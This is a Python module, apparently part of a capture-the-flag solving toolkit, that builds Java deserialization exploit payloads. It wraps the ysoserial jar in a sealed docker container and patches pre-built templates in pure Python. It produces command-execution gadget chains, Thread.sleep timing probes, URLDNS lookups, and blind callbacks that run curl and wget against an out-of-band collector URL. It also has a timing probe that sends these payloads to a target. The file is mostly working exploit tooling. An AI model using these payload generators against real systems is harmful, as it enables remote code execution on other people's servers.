#!/usr/bin/env python3
"""Java deserialization payloads for the live web lane (a HAND TOOL, like web_exploit.py; the Day 20 Java build).

  ysoserial(gadget, command)       real payload bytes (a JavaPayload, a bytes subclass with .route/.gadget/.command)
  java_sleep_payload(gadget, s)    a chain that calls Thread.sleep(s * 1000) itself (Runtime.exec returns at once,
                                   so `sleep N` as a command never delays the response; this does)
  java_urldns(url_or_host)         URLDNS: one DNS lookup of the host, no library needed (blind detection)
  java_encode(p, kind)             raw, base64, base64url, hex, gzip, gzip_base64; java_encode_like(p, observed)
                                   wraps it the way an observed value (cookie, parameter) is wrapped
  java_blind_payloads(...)         the probe set: sleep chains, curl/wget callbacks to tools/oob.py, URLDNS
  probe_java_time(send, ...)       blind timing test over the sleep chains (bounded by max_requests, paced by gap)
  java_status()                    which routes can build what, here and now

Routes, tried in this order by route="auto" (each one only emits bytes; nothing here deserializes anything):
  docker    the pinned ysoserial jar (YSOSERIAL_SHA256, checked before every use) in the pinned temurin 8 JRE image
            (JRE_IMAGE, by digest; `--pull never`), with --network none, a read-only root, every capability dropped,
            no-new-privileges, uid 10001, memory/cpu/pids limits, the jar's folder mounted read-only and nothing
            else. Every one of ysoserial 0.0.6's 34 gadgets builds there (Jython1 wants its own argument form).
  java      the java on PATH with --add-opens, for the gadgets in LOCAL_JAVA_OK only: under JDK 24 those build
            byte-identical to temurin 8 (TemplatesImpl ones up to ysoserial's random Pwner class name); the rest
            fail there or differ (CommonsCollections5, Groovy1, Hibernate2, JRMP*, JSON1, MozillaRhino1, Vaadin1
            fail; BeanShell1, Clojure differ). A java of major 8 builds every gadget.
  template  pure Python, no Java at all: java_templates.json holds streams the jar built with a placeholder
            command (exec), a placeholder sleep (sleep) and a placeholder URL (URLDNS); the placeholder is swapped
            with every length field it touches (TC_STRING / TC_LONGSTRING, a class file's CONSTANT_Utf8 and the
            byte[] that holds the class). tests/test_day20_web_java.py checks the output against the jar's own
            for several commands. Gadgets: TEMPLATE_GADGETS (exec), SLEEP_GADGETS (sleep), URLDNS.

The jar and its folder live outside git ($CTF_TOOLS_DIR, default ~/.huntress-tools, then ysoserial/);
tools/setup_ysoserial.sh fetches it once, checks the SHA-256, pulls the JRE image and compiles the sleep
generator (tools/ysoserial/HuntressSleep.java). `java_deser.py regen` rewrites java_templates.json from the jar.

Hard rules (as web_exploit.py): no socket of its own, no host named; a probe sends only through the caller's own
`send` callable (a WebClient request the caller built: scope lock, VPN stop, log). Nothing from a challenge
delivery is ever executed: the only programs run are the pinned jar and this repository's generator. Not on a
solve path, the opener or a clock; no solver answer changes.
"""
import base64
import gzip
import hashlib
import json
import math
import os
import re
import shutil
import struct
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env

HERE = Path(__file__).resolve().parent
REPO = HERE.parent.parent
TEMPLATES = HERE / "java_templates.json"

YSOSERIAL_VERSION = "v0.0.6"
YSOSERIAL_URL = "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
YSOSERIAL_SHA256 = "2c9bddd6a1a4ec66c1078ea97dacb61eb66d1c41aec7b6d21e3c72214ce170f1"   # fetched 2026-10-20
YSOSERIAL_SIZE = 59525376
# eclipse-temurin:8-jre (the multi-arch index digest, pulled 2026-10-20; arm64 and amd64)
JRE_IMAGE = "eclipse-temurin@sha256:1fc1cdba9c1e68173bc553b95438206b0b995f9f763cfc77feb45b27f5774d9b"
JAR_NAME = "ysoserial-all.jar"

JAVA_GAP = ("no route could build this Java payload: the ysoserial jar is missing or fails its SHA-256 "
            "(tools/setup_ysoserial.sh), docker or the pinned JRE image is not there, the local java cannot "
            "build this gadget, and it has no pure-Python template. Detect the stream with java_stream_kind(), "
            "name the libraries the app shows, and flag the gap to the main thread.")


class JavaGap(RuntimeError):
    """No route built the payload. str() names every route's reason."""


# ysoserial 0.0.6's gadgets (`java -jar ysoserial-all.jar` lists them) and the argument each takes when it is not
# a command. The library is what must be on the TARGET's class path.
GADGETS = {
    "AspectJWeaver": "aspectjweaver:1.9.2, commons-collections:3.2.2; arg '<file>;<base64 content>'",
    "BeanShell1": "bsh:2.0b5",
    "C3P0": "c3p0:0.9.5.2, mchange-commons-java:0.2.11; arg '<base url>:<classname>' (a remote class load)",
    "Click1": "click-nodeps:2.3.0, javax.servlet-api:3.1.0",
    "Clojure": "clojure:1.8.0",
    "CommonsBeanutils1": "commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2",
    "CommonsCollections1": "commons-collections:3.1 (JDK <= 8u71: AnnotationInvocationHandler)",
    "CommonsCollections2": "commons-collections4:4.0",
    "CommonsCollections3": "commons-collections:3.1 (JDK <= 8u71)",
    "CommonsCollections4": "commons-collections4:4.0",
    "CommonsCollections5": "commons-collections:3.1 (BadAttributeValueExpException.readObject: JDK 8u76+, no SecurityManager)",
    "CommonsCollections6": "commons-collections:3.1 (HashSet; any JDK version)",
    "CommonsCollections7": "commons-collections:3.1 (Hashtable; any JDK version)",
    "FileUpload1": "commons-fileupload:1.3.1, commons-io:2.4; arg 'write;<dir>;<content>' and other forms",
    "Groovy1": "groovy:2.3.9",
    "Hibernate1": "hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1",
    "Hibernate2": "hibernate-core:4.3.11.Final, ...; arg a JNDI URL",
    "JBossInterceptors1": "javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, ...",
    "JRMPClient": "(JDK only) arg '<host>:<port>' the target connects to",
    "JRMPListener": "(JDK only) arg '<port>' the target listens on",
    "JSON1": "json-lib:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1",
    "JavassistWeld1": "javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, ...",
    "Jdk7u21": "(JDK <= 7u21 only)",
    "Jython1": "jython-standalone:2.5.2; arg '<local file>;<remote path>'",
    "MozillaRhino1": "js:1.7R2",
    "MozillaRhino2": "js:1.7R2",
    "Myfaces1": "myfaces; arg an EL expression",
    "Myfaces2": "myfaces; arg '<base url>:<classname>'",
    "ROME": "rome:1.0",
    "Spring1": "spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE",
    "Spring2": "spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2",
    "URLDNS": "(JDK only) arg a URL: one DNS lookup of its host, nothing run",
    "Vaadin1": "vaadin-server:7.7.14, vaadin-shared:7.7.14",
    "Wicket1": "wicket-util:6.23.0, slf4j-api:1.6.4; arg 'write;<dir>;<content>' and other forms",
}
_BY_LOWER = {g.lower(): g for g in GADGETS}

# Built under JDK 24 with OPENS, byte-identical to temurin 8 (2026-10-20; TemplatesImpl ones up to the Pwner name).
LOCAL_JAVA_OK = frozenset({
    "C3P0", "Click1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
    "CommonsCollections4", "CommonsCollections6", "CommonsCollections7", "FileUpload1", "Hibernate1", "Jdk7u21",
    "MozillaRhino2", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"})
OPENS = ("java.base/java.util", "java.base/java.net", "java.base/java.lang", "java.base/java.lang.reflect",
         "java.base/java.io", "java.base/sun.reflect.annotation", "java.management/javax.management",
         "java.rmi/sun.rmi.server", "java.rmi/java.rmi.server",
         "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax",
         "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime", "java.base/java.util.concurrent",
         "java.desktop/java.beans", "java.base/sun.nio.ch")

TEMPLATE_GADGETS = ("CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4",
                    "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "CommonsBeanutils1")
SLEEP_GADGETS = TEMPLATE_GADGETS
# The probe order: the chains that work on a current JDK first.
PROBE_GADGETS = ("CommonsCollections6", "CommonsCollections5", "CommonsCollections7", "CommonsBeanutils1",
                 "CommonsCollections4", "CommonsCollections2")

PLACEHOLDER_CMD = "CSCTF_YSO_PLACEHOLDER_CMD_0123456789"
PLACEHOLDER_MS = 0x0000012345678ABC
PLACEHOLDER_HOST = "huntress-yso-placeholder.invalid"
PLACEHOLDER_URL = f"http://{PLACEHOLDER_HOST}/"

TC_STRING, TC_LONGSTRING, STREAM_HEAD = 0x74, 0x7C, b"\xac\xed\x00\x05"
CLASS_MAGIC = b"\xca\xfe\xba\xbe"


def canonical(gadget):
    """The gadget's own spelling; ValueError for a name ysoserial does not have (never passed to a tool)."""
    g = _BY_LOWER.get(str(gadget or "").strip().lower())
    if not g:
        raise ValueError(f"unknown gadget {gadget!r}; ysoserial {YSOSERIAL_VERSION} has: {', '.join(GADGETS)}")
    return g


class JavaPayload(bytes):
    """Payload bytes, with how they were made. Pass it anywhere bytes go."""

    def __new__(cls, data, *, gadget="", command="", route=""):
        o = super().__new__(cls, data)
        o.gadget, o.command, o.route = gadget, command, route
        return o

    def encode(self, kind="base64"):
        return java_encode(self, kind)

    def __repr__(self):
        return f"<JavaPayload {self.gadget} via {self.route}: {len(self)} bytes, sha256 {hashlib.sha256(self).hexdigest()[:16]}>"


# =====================================================================================
#  Encodings
# =====================================================================================

ENCODINGS = ("raw", "base64", "base64url", "hex", "gzip", "gzip_base64")


def java_encode(payload, kind="base64"):
    """raw and gzip give bytes; base64, base64url, hex and gzip_base64 give str. gzip has mtime 0 (reproducible)."""
    if not isinstance(payload, (bytes, bytearray, memoryview)):
        raise ValueError("payload must be bytes")
    b = bytes(payload)
    if kind == "raw":
        return b
    if kind == "base64":
        return base64.b64encode(b).decode()
    if kind == "base64url":
        return base64.urlsafe_b64encode(b).decode()
    if kind == "hex":
        return b.hex()
    if kind in ("gzip", "gzip_base64"):
        z = gzip.compress(b, mtime=0)
        return z if kind == "gzip" else base64.b64encode(z).decode()
    raise ValueError(f"kind must be one of {ENCODINGS}")


def java_encode_like(payload, observed):
    """(kind, encoded) wrapped as the observed value is (web_exploit.java_stream_kind: raw, base64, hex,
    gzip_base64; a base64 value with - or _ is base64url). An observed value that is no stream gives base64."""
    from web_exploit import java_stream_kind     # same folder; web_exploit imports nothing from here at load
    kind = java_stream_kind(observed) or "base64"
    if kind == "base64":
        s = observed.decode("latin-1") if isinstance(observed, (bytes, bytearray)) else str(observed or "")
        if "-" in s or "_" in s:
            kind = "base64url"
    return kind, java_encode(payload, kind)


# =====================================================================================
#  Stream and class-file patching (the template route)
# =====================================================================================

def mutf8(text):
    """Java's modified UTF-8 (DataOutput.writeUTF and CONSTANT_Utf8): NUL as C0 80, a supplementary
    character as two 3-byte surrogates."""
    if not isinstance(text, str):
        raise ValueError("mutf8 takes a str")
    out = bytearray()
    raw = text.encode("utf-16-be", "surrogatepass")
    for i in range(0, len(raw), 2):
        c = (raw[i] << 8) | raw[i + 1]
        if 0x0001 <= c <= 0x007F:
            out.append(c)
        elif c <= 0x07FF:
            out += bytes((0xC0 | (c >> 6), 0x80 | (c & 0x3F)))
        else:
            out += bytes((0xE0 | (c >> 12), 0x80 | ((c >> 6) & 0x3F), 0x80 | (c & 0x3F)))
    return bytes(out)


def _tc_string(text):
    enc = mutf8(text)
    if len(enc) <= 0xFFFF:
        return bytes((TC_STRING,)) + struct.pack(">H", len(enc)) + enc
    return bytes((TC_LONGSTRING,)) + struct.pack(">Q", len(enc)) + enc


def _swap_tc_string(stream, old, new):
    """Replace the one TC_STRING whose value is `old` with one whose value is `new` (TC_LONGSTRING past 65535
    bytes). Both take one handle, so no reference after it moves. ValueError unless `old` occurs exactly once."""
    pat = _tc_string(old)
    n = stream.count(pat)
    if n != 1:
        raise ValueError(f"template: TC_STRING {old!r} occurs {n} times, not once")
    return stream.replace(pat, _tc_string(new))


_CP_FIXED = {3: 4, 4: 4, 5: 8, 6: 8, 7: 2, 8: 2, 9: 4, 10: 4, 11: 4, 12: 4, 15: 3, 16: 2, 17: 4, 18: 4, 19: 2, 20: 2}


def _parse_cp(cls):
    """[(tag, start, end)] of a class file's constant pool entries and the offset after the pool; ValueError on
    anything that is not a whole class header."""
    if not cls.startswith(CLASS_MAGIC) or len(cls) < 10:
        raise ValueError("not a class file")
    count = struct.unpack(">H", cls[8:10])[0]
    pos, i, entries = 10, 1, []
    while i < count:
        if pos >= len(cls):
            raise ValueError("constant pool runs past the class")
        tag = cls[pos]
        if tag == 1:
            if pos + 3 > len(cls):
                raise ValueError("constant pool Utf8 length runs past the class")
            ln = struct.unpack(">H", cls[pos + 1:pos + 3])[0]
            end = pos + 3 + ln
        elif tag in _CP_FIXED:
            end = pos + 1 + _CP_FIXED[tag]
        else:
            raise ValueError(f"unknown constant pool tag {tag} at {pos}")
        if end > len(cls):
            raise ValueError("constant pool runs past the class")
        entries.append((tag, pos, end))
        i += 2 if tag in (5, 6) else 1
        pos = end
    return entries, pos


def _rewrite_class(cls, utf8_fn=None, long_fn=None):
    """The class with each CONSTANT_Utf8 value passed through utf8_fn(bytes) -> bytes|None (None keeps it) and
    each CONSTANT_Long through long_fn(int) -> int|None. Everything after the pool is copied as it is."""
    entries, end = _parse_cp(cls)
    out = bytearray(cls[:10])
    for tag, a, b in entries:
        if tag == 1 and utf8_fn:
            new = utf8_fn(cls[a + 3:b])
            if new is not None:
                if len(new) > 0xFFFF:
                    raise ValueError("a CONSTANT_Utf8 holds at most 65535 bytes")
                out += b"\x01" + struct.pack(">H", len(new)) + new
                continue
        if tag == 5 and long_fn:
            new = long_fn(struct.unpack(">q", cls[a + 1:b])[0])
            if new is not None:
                out += b"\x05" + struct.pack(">q", new)
                continue
        out += cls[a:b]
    return bytes(out) + cls[end:]


def _class_blobs(stream):
    """[(start, length)] of every class file held in a byte[] of the stream (the int length just before the
    magic, and a constant pool that parses inside it)."""
    found, at = [], 0
    while True:
        p = stream.find(CLASS_MAGIC, at)
        if p < 0:
            return found
        at = p + 1
        if p < 4:
            continue
        ln = struct.unpack(">i", stream[p - 4:p])[0]
        if ln < 10 or p + ln > len(stream):
            continue
        try:
            _, end = _parse_cp(stream[p:p + ln])
        except ValueError:
            continue
        if end <= ln:
            found.append((p, ln))


def _rewrite_classes(stream, **fns):
    """The stream with every class blob rewritten by _rewrite_class(**fns) and its byte[] length fixed."""
    out, last = bytearray(), 0
    for p, ln in _class_blobs(stream):
        new = _rewrite_class(stream[p:p + ln], **fns)
        out += stream[last:p - 4] + struct.pack(">i", len(new)) + new
        last = p + ln
    return bytes(out + stream[last:])


_PWNER = re.compile(rb"^(L?)ysoserial/Pwner\d+(;?)$")


def normalize_pwner(stream):
    """ysoserial names each TemplatesImpl class ysoserial.Pwner<System.nanoTime()>; this gives every such name
    one fixed spelling, so two builds of the same payload compare equal (tests, regen)."""
    return _rewrite_classes(bytes(stream), utf8_fn=lambda v: (_PWNER.sub(rb"\1ysoserial/Pwner0\2", v)
                                                              if _PWNER.match(v) else None))


_TEMPLATES = None


def _templates():
    global _TEMPLATES
    if _TEMPLATES is None:
        _TEMPLATES = json.loads(TEMPLATES.read_text())
    return _TEMPLATES


def _check_command(command):
    if not isinstance(command, str) or not command:
        raise ValueError("command must be a non-empty string")
    return command


def template_payload(gadget, command):
    """The exec chain from its template: the placeholder command swapped for `command` (a TC_STRING in the
    commons-collections 3 chains, a CONSTANT_Utf8 of the TemplatesImpl class otherwise)."""
    g = canonical(gadget)
    _check_command(command)
    t = _templates()["exec"].get(g)
    if not t:
        raise JavaGap(f"{g}: no template (templates: {', '.join(TEMPLATE_GADGETS)})")
    # The checked-in templates were built with the placeholder recorded in their own _meta;
    # honour it (falling back to the module constant for an inline/monkeypatched template).
    placeholder = _templates().get("_meta", {}).get("placeholder_cmd", PLACEHOLDER_CMD)
    raw = base64.b64decode(t["b64"])
    if t["where"] == "tc_string":
        out = _swap_tc_string(raw, placeholder, command)
    else:
        enc, hits = mutf8(command), []

        def fn(v):
            if v == placeholder.encode():
                hits.append(1)
                return enc
            return None
        if len(enc) > 0xFFFF:
            raise JavaGap(f"{g}: a command over 65535 bytes does not fit a class constant")
        out = _rewrite_classes(raw, utf8_fn=fn)
        if len(hits) != 1:
            raise ValueError(f"template {g}: the placeholder constant occurs {len(hits)} times, not once")
    return JavaPayload(out, gadget=g, command=command, route="template")


def java_sleep_payload(gadget, seconds):
    """A chain whose last call is Thread.sleep(seconds * 1000) on the target (template; the long patched in
    place, nothing else moves). seconds 0 is the probe's control."""
    g = canonical(gadget)
    try:
        secs = float(seconds)
    except (TypeError, ValueError):
        raise ValueError("seconds must be a number")
    if not math.isfinite(secs):
        raise ValueError("seconds must be a finite number")
    ms = int(round(secs * 1000))
    if ms < 0 or ms > 600_000:
        raise ValueError("seconds must be 0 to 600")
    t = _templates()["sleep"].get(g)
    if not t:
        raise JavaGap(f"{g}: no sleep template (sleep templates: {', '.join(SLEEP_GADGETS)})")
    raw = base64.b64decode(t["b64"])
    pat = struct.pack(">q", PLACEHOLDER_MS)
    if raw.count(pat) != 1:
        raise ValueError(f"sleep template {g}: the placeholder occurs {raw.count(pat)} times, not once")
    if t["where"] == "class_long":
        hits = []

        def fn(v):
            if v == PLACEHOLDER_MS:
                hits.append(1)
                return ms
            return None
        out = _rewrite_classes(raw, long_fn=fn)
        if len(hits) != 1:
            raise ValueError(f"sleep template {g}: the placeholder long occurs {len(hits)} times in the class")
    else:
        out = raw.replace(pat, struct.pack(">q", ms))
    return JavaPayload(out, gadget=g, command=f"Thread.sleep({ms})", route="template")


def _urldns_parts(url_or_host):
    s = str(url_or_host or "").strip()
    if not s:
        raise ValueError("give a host or an http(s) URL")
    if "://" not in s:
        s = f"http://{s}/"
    u = urllib.parse.urlsplit(s)
    if u.scheme not in ("http", "https") or not u.hostname:
        raise ValueError("URLDNS takes an http or https URL, or a bare host")
    if u.port is not None or u.username is not None or u.password is not None or u.fragment or "@" in u.netloc:
        raise JavaGap("URLDNS template: a port, user info or fragment changes the stream's shape; use the jar")
    if not re.fullmatch(r"[A-Za-z0-9.\-_]+", u.netloc):
        raise JavaGap("URLDNS template: the host must be plain letters, digits, dots, hyphens")
    file = u.path + (("?" + u.query) if u.query else "")
    return s, u.scheme, u.netloc, file


def java_urldns(url_or_host, route="auto", timeout=90):
    """URLDNS for a bare host or an http(s) URL: the target resolves the host once while it deserializes (no
    library needed, nothing run). Only a DNS collector sees it: tools/oob.py hears HTTP and TCP, not DNS, and an
    IP address is resolved with no lookup at all."""
    s = str(url_or_host or "").strip()
    url = s if "://" in s else f"http://{s}/"
    return ysoserial("URLDNS", url, route=route, timeout=timeout)


def template_urldns(url):
    full, scheme, host, file = _urldns_parts(url)
    raw = base64.b64decode(_templates()["urldns"]["b64"])
    out = _swap_tc_string(raw, PLACEHOLDER_URL, full)
    out = _swap_tc_string(out, PLACEHOLDER_HOST, host)
    out = _swap_tc_string(out, "/", file)
    out = _swap_tc_string(out, "http", scheme)
    return JavaPayload(out, gadget="URLDNS", command=full, route="template")


# =====================================================================================
#  The jar routes
# =====================================================================================

def tools_dir():
    return Path(ctf_env.get("CTF_TOOLS_DIR") or (Path.home() / ".huntress-tools")).expanduser()


def jar_dir():
    return tools_dir() / "ysoserial"


_JAR_OK = {}


def jar_path():
    """(path, '') when the pinned jar is there and its SHA-256 is YSOSERIAL_SHA256 (hashed once per size and
    mtime), else (None, reason)."""
    p = jar_dir() / JAR_NAME
    try:
        st = p.stat()
    except OSError:
        return None, f"no jar at {p} (tools/setup_ysoserial.sh)"
    key = (str(p), st.st_size, st.st_mtime_ns)
    if key not in _JAR_OK:
        h = hashlib.sha256()
        with open(p, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                h.update(chunk)
        _JAR_OK[key] = h.hexdigest()
    if _JAR_OK[key] != YSOSERIAL_SHA256:
        return None, f"{p} has SHA-256 {_JAR_OK[key][:16]}..., not the pinned {YSOSERIAL_SHA256[:16]}...: not used"
    return p, ""


def _env():
    env = {k: v for k, v in os.environ.items() if k != "CTF_TOKEN"}
    path = env.get("PATH", "")
    for extra in ("/usr/local/bin", "/opt/homebrew/bin"):
        if extra not in path.split(":"):
            path = f"{path}:{extra}" if path else extra
    env["PATH"] = path
    return env


def _docker_cli():
    override = ctf_env.get("CTF_DOCKER")
    if override:
        return override
    found = shutil.which("docker", path=_env()["PATH"])
    if found:
        return found
    for p in ("/usr/local/bin/docker", "/opt/homebrew/bin/docker", "/Applications/Docker.app/Contents/Resources/bin/docker"):
        if os.access(p, os.X_OK):
            return p
    return None


_IMAGE_OK = {}


def docker_ready():
    """(True, '') when the docker daemon answers and the pinned JRE image is here, else (False, reason)."""
    cli = _docker_cli()
    if not cli:
        return False, "docker is not installed"
    if _IMAGE_OK.get(cli):
        return True, ""
    try:
        p = subprocess.run([cli, "image", "inspect", "--format", "{{.Id}}", JRE_IMAGE], capture_output=True,
                           timeout=10, env=_env(), stdin=subprocess.DEVNULL)
    except (OSError, subprocess.TimeoutExpired) as e:
        return False, f"docker did not answer ({type(e).__name__})"
    if p.returncode != 0:
        err = p.stderr.decode("utf-8", "replace").strip().splitlines()
        return False, (err[0][:160] if err else "image inspect failed") + " (tools/setup_ysoserial.sh pulls it)"
    _IMAGE_OK[cli] = True
    return True, ""


def docker_argv(java_args, stdin=False):
    """The docker command line that runs `java <java_args>` in the pinned JRE, sealed as tools/sandbox.py
    seals its containers, with only the jar's folder mounted (read-only). stdin=True adds -i."""
    return [_docker_cli() or "docker", "run", *(["-i"] if stdin else []), "--rm", "--pull", "never", "--network", "none", "--read-only",
            "--cap-drop", "ALL", "--security-opt", "no-new-privileges", "--user", "10001:10001",
            "--tmpfs", "/tmp:rw,nosuid,nodev,size=64m", "-e", "LANG=C.UTF-8", "--memory", "1g", "--cpus", "2", "--pids-limit", "256",
            "-v", f"{jar_dir()}:/y:ro", JRE_IMAGE, "java", *java_args]


def _run(argv, timeout):
    try:
        p = subprocess.run(argv, capture_output=True, timeout=timeout, env=_env(), stdin=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        return None, f"did not finish in {timeout:g} s"
    except (OSError, ValueError) as e:      # ValueError: a NUL in an argument (argv cannot carry one)
        return None, f"could not run ({type(e).__name__}: {e})"
    if p.returncode != 0 or not p.stdout.startswith(STREAM_HEAD):
        err = [ln for ln in p.stderr.decode("utf-8", "replace").splitlines() if ln.strip()]
        why = next((ln for ln in err if "Exception" in ln or "Error" in ln), err[0] if err else "")
        return None, f"exit {p.returncode}: {why.strip()[:200]}"
    return p.stdout, ""


_JAVA_MAJOR = {}


def local_java():
    """(path, major) of the java on PATH, or (None, 0)."""
    j = shutil.which("java", path=_env()["PATH"])
    if not j:
        return None, 0
    if j not in _JAVA_MAJOR:
        try:
            p = subprocess.run([j, "-version"], capture_output=True, timeout=20, env=_env(), stdin=subprocess.DEVNULL)
            m = re.search(rb'version "(\d+)(?:\.(\d+))?', p.stderr + p.stdout)
            major = int(m.group(1)) if m else 0
            if major == 1 and m.group(2):
                major = int(m.group(2))
        except (OSError, subprocess.TimeoutExpired):
            major = 0
        _JAVA_MAJOR[j] = major
    return j, _JAVA_MAJOR[j]


def _via_docker(gadget, arg, timeout):
    jar, why = jar_path()
    if not jar:
        return None, why
    ok, why = docker_ready()
    if not ok:
        return None, why
    return _run(docker_argv(["-jar", f"/y/{JAR_NAME}", gadget, arg]), timeout)


def _via_java(gadget, arg, timeout):
    jar, why = jar_path()
    if not jar:
        return None, why
    j, major = local_java()
    if not j:
        return None, "no java on PATH"
    if major > 8 and gadget not in LOCAL_JAVA_OK:
        return None, f"java {major} does not build {gadget} like temurin 8 (LOCAL_JAVA_OK)"
    opens = [f"--add-opens={m}=ALL-UNNAMED" for m in OPENS] if major > 8 else []
    return _run([j, *opens, "-jar", str(jar), gadget, arg], timeout)


def ysoserial(gadget, command, route="auto", timeout=90):
    """Payload bytes for ysoserial's `gadget` with `command` (its argument: a command for the exec chains; see
    GADGETS for the others). route: auto (docker, then the local java, then the template), docker, java or
    template. Returns a JavaPayload; raises JavaGap with every route's reason when none built it, ValueError for
    an unknown gadget or an empty command. Only the pinned jar or the template run: nothing is deserialized."""
    g = canonical(gadget)
    _check_command(command)
    if route not in ("auto", "docker", "java", "template"):
        raise ValueError("route must be auto, docker, java or template")
    tried = []
    for r in (("docker", "java", "template") if route == "auto" else (route,)):
        if r == "template":
            try:
                return template_urldns(command) if g == "URLDNS" else template_payload(g, command)
            except JavaGap as e:
                tried.append(f"template: {e}")
            continue
        data, why = (_via_docker if r == "docker" else _via_java)(g, command, timeout)
        if data:
            return JavaPayload(data, gadget=g, command=command, route=r)
        tried.append(f"{r}: {why}")
    raise JavaGap(f"{g}: " + "; ".join(tried) + ". " + JAVA_GAP)


def java_status():
    """What can build what here and now (no payload is built)."""
    jar, jwhy = jar_path()
    dok, dwhy = docker_ready()
    j, major = local_java()
    return {"jar": str(jar) if jar else None, "jar_problem": jwhy, "docker": dok, "docker_problem": dwhy,
            "image": JRE_IMAGE, "java": j, "java_major": major,
            "routes": {"docker": "every gadget" if (jar and dok) else None,
                       "java": (("every gadget" if major and major <= 8 else ", ".join(sorted(LOCAL_JAVA_OK)))
                                if (jar and j) else None),
                       "template": ", ".join(TEMPLATE_GADGETS) + ", URLDNS; sleep: " + ", ".join(SLEEP_GADGETS)}}


# =====================================================================================
#  Blind detection
# =====================================================================================

def java_blind_payloads(*, seconds=None, callback=None, dns_host=None, gadgets=PROBE_GADGETS, encode="raw",
                        route="template"):
    """The blind probe set, one dict per payload: {gadget, signal, detail, payload}.
      seconds   a Thread.sleep chain per gadget (signal 'sleep'); send each and time it (probe_java_time does).
      callback  the collector URL tools/oob.py gives (`payloads <token>`, `http://<tunnel ip>:<port>/<token>`):
                per gadget `curl -s <callback>/<gadget>` and `wget -q -O /dev/null <callback>/<gadget>` through
                Runtime.exec (no shell: needs curl or wget on the target and a route back to the tunnel);
                `tools/oob.py hits --token <token>` names the gadget that fired by its path.
      dns_host  one URLDNS payload for `<label>.<dns_host>` (signal 'dns'): only a DNS collector sees it.
    Nothing is sent here."""
    out = []
    for g in (canonical(x) for x in gadgets):
        if seconds is not None:
            p = java_sleep_payload(g, seconds)
            out.append({"gadget": g, "signal": "sleep", "detail": p.command, "payload": java_encode(p, encode)})
        if callback:
            cb = str(callback).rstrip("/")
            if not re.fullmatch(r"https?://[^\s]+", cb):
                raise ValueError("callback must be an http(s) URL with no spaces (Runtime.exec splits on spaces)")
            for cmd in (f"curl -s {cb}/{g}", f"wget -q -O /dev/null {cb}/{g}"):
                p = ysoserial(g, cmd, route=route)
                out.append({"gadget": g, "signal": "http", "detail": cmd, "payload": java_encode(p, encode)})
    if dns_host:
        host = f"jdeser{int(time.time()) % 100000}.{str(dns_host).strip('.')}"
        p = java_urldns(host, route=route)
        out.append({"gadget": "URLDNS", "signal": "dns", "detail": host, "payload": java_encode(p, encode)})
    return out


def _elapsed(r):
    if isinstance(r, (int, float)):
        return float(r)
    if isinstance(r, dict):
        return float(r.get("elapsed") or 0.0)
    return float(getattr(r, "elapsed", 0.0) or 0.0)


def probe_java_time(send, *, gadgets=PROBE_GADGETS, seconds=4, timeout=10.0, encode="raw", max_requests=30,
                    gap=0.2):
    """Blind timing test over the sleep chains. `send(data)` is the caller's: it puts `data` (bytes or str, as
    `encode` makes it) where the app deserializes (a cookie, a parameter, a body) through its own WebClient and
    returns the response dict (its 'elapsed') or the seconds. Per gadget: Thread.sleep(0) then Thread.sleep(N);
    a lead (at least 0.8*N slower) is claimed only after a second N pair and a 2N pair (sleep first, then the
    control), the 2N one at least 0.8*2N slower; 2N must fit `timeout` minus 2 s or N is used again (`scaled`
    false). A found gadget names a chain the target's class path holds; build the command with ysoserial().
    Returns {found, gadget, delta, timings, requests, scaled}."""
    seconds = float(seconds)
    limit = float(timeout) - 2.0
    if seconds <= 0 or seconds > limit:
        raise ValueError("seconds must be above 0 and at most timeout minus 2")
    double = 2 * seconds if 2 * seconds <= limit else seconds
    sent, timings = 0, []

    def timed(data):
        nonlocal sent
        if gap:
            time.sleep(gap)
        r = send(data)
        sent += 1
        return _elapsed(r)

    for g in (canonical(x) for x in gadgets):
        if g not in SLEEP_GADGETS:
            continue
        fast = java_encode(java_sleep_payload(g, 0), encode)
        slow = java_encode(java_sleep_payload(g, seconds), encode)
        slow2 = java_encode(java_sleep_payload(g, double), encode)
        if sent + 2 > max_requests:
            return {"found": False, "requests": sent, "stopped": "max_requests", "timings": timings}
        t0, t1 = timed(fast), timed(slow)
        timings.append({"gadget": g, "control": t0, "sleep": t1})
        if t1 - t0 < 0.8 * seconds:
            continue
        deltas, ok = [t1 - t0], True
        for n, p in ((seconds, slow), (double, slow2)):
            if sent + 2 > max_requests:
                return {"found": False, "requests": sent, "stopped": "max_requests", "lead": g, "timings": timings}
            c1, c0 = timed(p), timed(fast)
            timings.append({"gadget": g, "control": c0, "sleep": c1, "confirm": n})
            if c1 - c0 < 0.8 * n:
                ok = False
                break
            deltas.append(c1 - c0)
        if ok:
            return {"found": True, "gadget": g, "delta": round(min(deltas[:2]), 3), "timings": timings,
                    "requests": sent, "scaled": double > seconds}
    return {"found": False, "requests": sent, "timings": timings}


# =====================================================================================
#  regen and CLI
# =====================================================================================

def _jar_build(gadget, arg, timeout=120):
    data, why = _via_docker(gadget, arg, timeout)
    if not data:
        raise SystemExit(f"regen: docker route failed for {gadget}: {why}")
